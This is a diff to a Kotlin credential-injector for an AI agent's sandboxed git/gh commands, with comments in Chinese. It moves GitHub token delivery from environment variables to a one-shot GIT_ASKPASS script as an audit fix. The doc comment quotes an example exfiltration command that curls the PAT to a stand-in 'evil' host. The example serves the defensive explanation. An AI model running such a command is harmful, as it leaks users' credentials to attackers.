@@ -1,58 +1,59 @@
 package com.apex.agent.github
 
 /**
- * # GitHub 终端凭据注入器（纯函数，无状态）
+ * # GitHub 终端凭据桥（纯函数，无状态）—— Git 审计 P0-1 根修
  *
- * G2/G3 根修：把 App 内已连接的 GitHub PAT 注入到 **Ubuntu 沙箱内 gh/git
- * 命令的执行 env**——不写盘、不进 bashrc/profile、只在单次命令的进程
- * env 里存活（命令结束即消失）。
+ * **旧实现（已废除）**：把 `GH_TOKEN`/`GITHUB_TOKEN` 写进整个 `sh -c`
+ * 进程 env——复合命令 `git pull && curl -s https://evil/x -H "t: $GH_TOKEN"`
+ * 首词是 git 即命中首词启发式，后半段任意命令直接读走 PAT；恶意仓库的
+ * git hooks（作为 git 子进程）同样继承 env。这是审计判定的确定性凭据
+ * 外传链。
  *
- * ## 注入内容
- * - `GH_TOKEN` / `GITHUB_TOKEN` → PAT（gh CLI 的两个官方 env 凭据入口，
- *   存在即免 `gh auth login`）；
- * - `GIT_CONFIG_COUNT/GIT_CONFIG_KEY_0/GIT_CONFIG_VALUE_0` → 追加
- *   `credential.https://github.com.helper = !gh auth git`（git ≥ 2.31 的
- *   env 配置机制）——让**纯 git 命令**（clone/push/pull）的 GitHub HTTPS
- *   凭据也走 gh（gh 用 GH_TOKEN 应答）。沙箱 git ≥ 2.43 满足版本要求。
+ * **新实现**：PAT **零进 env**。凭据经一次性 `GIT_ASKPASS` 脚本签发
+ * （脚本本体由 [GithubCredentialIssuer] 写入 guest /tmp、含 PAT、命令结束
+ * 吊销——runner 通道显式 dispose，终端通道靠 30 分钟惰性清扫兜底），
+ * env 里只出现脚本**路径**：
+ *
+ * - `GIT_ASKPASS`：git 在 HTTPS 需要凭据时调用——脚本校验提示串指向
+ *   github.com 才应答（凭据只流向 github.com，恶意 hooks 继承路径也
+ *   无法把 token 读走，除非它对 github.com 发起真实 git 操作）；
+ * - `GIT_TERMINAL_PROMPT=0`：askpass 失败时 git 快速失败而非挂起等终端。
  *
  * ## 触发条件
  * [isGitOrGhCommand]：命令首词（basename）是 `git` 或 `gh`。复合命令
- * （`cd /ws && git pull`）首词是 cd → 不注入——已知边界，agent 的常规
- * 路径（git_* 工具 / TerminalExec 直跑）均以 git/gh 开头；交互式 PTY
- * 会话**刻意不注入**（长驻 shell 的 env 对其中所有命令可见，暴露面大
- * 于单次命令；见 worklog 的落点结论）。
+ * （`cd /ws && git pull`）首词是 cd → 不注入。启发式仍保留的正当性：
+ * 注入内容已无秘密（只有路径），启发式漏判的代价从「凭据外传」降级为
+ * 「该命令拿不到凭据」；命中面越窄，askpass 脚本的暴露窗口越小。
  *
- * ## 失效边界（防御式，全部诚实降级）
- * - gh 未装（旧 rootfs）：仅 git 需要凭据时才触发 helper → 公开仓库
- *   clone/pull 照常（无需凭据不调 helper）；私有/push 会得到 helper 失败
- *   报错——与未注入时的终端交互失败同构，不劣化既有行为；
- * - GitHub 未连接（token null/blank）：原样返回，零注入零报错。
+ * ## 行为变化（诚实声明）
+ * - 终端里 `git push`（私有/push 类）依旧可用（askpass 应答）；
+ * - 终端里 `gh pr create` 等 gh 命令**失去认证**（GH_TOKEN 不再注入，
+ *   gh 无 askpass 语义）——引导走 GitHub REST 工具族；
+ * - 非github.com 远程无凭据（白名单策略，见 GitCommandPolicy）。
  */
 object GithubTerminalEnvInjector {
 
-    /** gh CLI 读取的 env 凭据键（官方文档口径，两个都注入）。 */
-    private val GH_ENV_KEYS = listOf("GH_TOKEN", "GITHUB_TOKEN")
-
     /**
-     * 注入 GitHub 凭据到命令执行 env。
+     * 注入 git 凭据桥到命令执行 env。
      *
      * @param env 命令原 guest env 基线（不会被修改——返回新 map）。
      * @param command 命令串（首词判定 git/gh；可为完整命令行，只看首词）。
-     * @param token 已连接的 GitHub PAT（null/blank = 未连接 → 原样返回）。
-     * @return 注入后的 env（原 map 无命中时同引用返回，零拷贝）。
+     * @param askPassGuestPath 已签发的 askpass 脚本 guest 路径
+     *   （null = 未连接 GitHub 或签发失败 → 原样返回，零注入零报错）。
+     * @return 注入后的 env（无注入时同引用返回，零拷贝）。
      */
-    fun inject(env: Map<String, String>, command: String, token: String?): Map<String, String> {
-        if (token.isNullOrBlank()) return env
+    fun inject(
+        env: Map<String, String>,
+        command: String,
+        askPassGuestPath: String?,
+    ): Map<String, String> {
+        if (askPassGuestPath.isNullOrBlank()) return env
         if (!isGitOrGhCommand(command)) return env
         val result = LinkedHashMap(env)
-        for (key in GH_ENV_KEYS) result[key] = token
-        // git 凭据桥（env 配置机制，git ≥ 2.31）：仅作用于 github.com 的
-        // HTTPS 凭据，不碰用户自己的 gitconfig。调用方 env 若已设置
-        // GIT_CONFIG_COUNT（罕见），以本注入为准（真实 PAT 优先于 agent
-        // 拼凑的值）。
-        result["GIT_CONFIG_COUNT"] = "1"
-        result["GIT_CONFIG_KEY_0"] = "credential.https://github.com.helper"
-        result["GIT_CONFIG_VALUE_0"] = "!gh auth git"
+        result["GIT_ASKPASS"] = askPassGuestPath
+        // askpass 不可用/拒答时快速失败，绝不挂起等终端输入（TERM=dumb
+        // 的管道执行通道里终端提示只会变成静默挂起）
+        result["GIT_TERMINAL_PROMPT"] = "0"
         return result
     }
 
